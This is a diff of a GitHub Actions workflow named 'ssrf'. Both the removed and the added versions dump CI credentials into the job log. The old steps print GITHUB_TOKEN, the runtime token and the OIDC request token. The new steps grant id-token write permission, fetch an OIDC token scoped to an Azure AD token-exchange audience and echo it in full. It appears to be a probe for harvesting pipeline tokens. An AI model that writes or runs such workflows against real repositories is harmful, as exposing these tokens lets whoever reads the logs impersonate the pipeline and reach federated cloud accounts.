@@ -1,17 +1,16 @@
 name: ssrf
 on: [push]
+permissions:
+  id-token: write
+  contents: read
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: env dump
+      - name: OIDC token
         run: |
-          echo "TOKEN: $GITHUB_TOKEN"
-          echo "RUNTIME: $ACTIONS_RUNTIME_TOKEN"
-          echo "CACHE: $ACTIONS_CACHE_URL"
-          echo "ID: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "IDTOKEN: $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
-          curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" \
-            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | head -20
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          echo "ID URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "ID TOKEN: $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -m json.tool)
+          echo "OIDC: $TOKEN"
